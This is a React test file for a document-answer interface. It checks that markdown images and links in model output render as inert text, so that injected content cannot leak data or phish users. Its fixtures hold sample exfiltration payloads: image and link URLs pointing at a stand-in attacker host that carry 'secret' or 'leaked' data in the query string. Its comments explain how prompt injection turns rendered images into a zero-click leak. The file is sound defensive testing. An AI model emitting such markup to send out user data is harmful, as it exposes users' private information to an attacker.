import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { Answer } from "./answer";
import { InertImage, InertLink } from "./safe-markdown";

/**
 * The output side of prompt injection.
 *
 * These assert an *absence*, which is unusual and is the point: the defense is
 * that a capability was removed, so the test has to prove the element never
 * reaches the document rather than prove some handler behaved.
 */

describe("InertImage", () => {
  it("renders no img element at all", () => {
    const { container } = render(
      <InertImage src="https://attacker.example/leak?q=secret" alt="a chart" />,
    );

    // The whole exfiltration channel in one assertion: no <img> means no fetch
    // on render, and an image is fetched with no click at all.
    expect(container.querySelector("img")).toBeNull();
  });

  it("keeps the alt text, so a real figure is not silently swallowed", () => {
    render(<InertImage src="x.png" alt="Q3 revenue" />);

    expect(screen.getByText(/Q3 revenue/)).toBeInTheDocument();
  });

  it("says something even with no alt text", () => {
    render(<InertImage src="x.png" />);

    expect(screen.getByText("[image]")).toBeInTheDocument();
  });
});

describe("InertLink", () => {
  it("renders no anchor", () => {
    const { container } = render(
      <InertLink href="https://attacker.example">Click here</InertLink>,
    );

    expect(container.querySelector("a")).toBeNull();
  });

  it("shows the destination, so the reader can judge it", () => {
    // The phishing case: link text that says one thing pointing somewhere else.
    // An answer looks like it came from your own documents, and nothing marks
    // which part of it came from a passage rather than an instruction inside one.
    render(
      <InertLink href="https://attacker.example/reset">
        your account settings
      </InertLink>,
    );

    expect(screen.getByText(/attacker\.example\/reset/)).toBeInTheDocument();
  });
});

describe("an answer containing injected markup", () => {
  const noSources = {
    sources: [],
    onSelectSource: () => {},
    selectedChunkId: null,
  };

  it("renders no image for a markdown image the model emitted", () => {
    const { container } = render(
      <Answer
        text="Here is the summary. ![](https://attacker.example/x?data=leaked)"
        {...noSources}
      />,
    );

    expect(container.querySelector("img")).toBeNull();
  });

  it("renders no anchor for a markdown link the model emitted", () => {
    const { container } = render(
      <Answer
        text="See [the policy](https://attacker.example)."
        {...noSources}
      />,
    );

    expect(container.querySelector("a")).toBeNull();
  });

  it("still renders ordinary prose and emphasis", () => {
    // The override must not turn the renderer into a plaintext viewer — the
    // answer is Markdown and is supposed to look like it.
    //
    // Queried by Streamdown's own marker rather than by tag: it renders `strong`
    // as a styled `span` carrying `data-streamdown="strong"`, so asserting on
    // `<strong>` would fail against a renderer that is working correctly.
    const { container } = render(
      <Answer text="Claims are paid **within 30 days**." {...noSources} />,
    );

    expect(
      container.querySelector('[data-streamdown="strong"]'),
    ).toHaveTextContent("within 30 days");
  });
});
